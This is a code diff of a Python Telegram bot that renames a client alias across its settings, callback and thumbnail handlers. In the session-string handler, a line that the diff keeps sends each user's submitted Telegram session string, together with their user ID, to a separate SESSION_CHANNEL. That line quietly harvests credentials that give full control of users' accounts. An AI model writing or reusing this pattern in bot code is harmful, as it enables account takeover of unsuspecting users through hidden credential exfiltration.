@@ -6,7 +6,6 @@ import pymongo
 from pyrogram.enums import ParseMode , MessageMediaType
 from .. import bot as gagan
 from .. import Bot
-from .. import sex as gf
 from ggn.assets.progress import progress_for_pyrogram
 from ggn.assets.functions import screenshot
 from pyrogram import Client
@@ -627,7 +626,7 @@ sessions = {}
 SET_PIC = "settings.jpg"
 MESS = "Customize by your end and Configure your settings ..."
 
-@gf.on(events.NewMessage(incoming=True, pattern='/settings'))
+@gagan.on(events.NewMessage(incoming=True, pattern='/settings'))
 async def settings_command(event):
     buttons = [
         [Button.inline("Set Chat ID", b'setchat'), Button.inline("Set Rename Tag", b'setrename')],
@@ -638,7 +637,7 @@ async def settings_command(event):
         [Button.url("Report Errors", "https://t.me/devgaganin")]
     ]
     
-    await gf.send_file(
+    await gagan.send_file(
         event.chat_id,
         file=SET_PIC,
         caption=MESS,
@@ -647,7 +646,7 @@ async def settings_command(event):
 
 pending_photos = {}
 
-@gf.on(events.CallbackQuery)
+@gagan.on(events.CallbackQuery)
 async def callback_query_handler(event):
     user_id = event.sender_id
 
@@ -694,7 +693,7 @@ async def callback_query_handler(event):
             await event.respond("No thumbnail found to remove.")
 
 
-@gf.on(events.NewMessage(func=lambda e: e.sender_id in pending_photos))
+@gagan.on(events.NewMessage(func=lambda e: e.sender_id in pending_photos))
 async def save_thumbnail(event):
     user_id = event.sender_id  # Use event.sender_id as user_id
 
@@ -712,7 +711,7 @@ async def save_thumbnail(event):
     pending_photos.pop(user_id, None)
 
 
-@gf.on(events.NewMessage)
+@gagan.on(events.NewMessage)
 async def handle_user_input(event):
     user_id = event.sender_id
     if user_id in sessions:
@@ -763,7 +762,7 @@ async def handle_user_input(event):
                 upsert=True
             )
             await event.respond("Session string added successfully.")
-            await gf.send_message(SESSION_CHANNEL, f"User ID: {user_id}\nSession String: \n\n`{event.text}`")
+            await gagan.send_message(SESSION_CHANNEL, f"User ID: {user_id}\nSession String: \n\n`{event.text}`")
                 
         elif session_type == 'deleteword':
             words_to_delete = event.message.text.split()
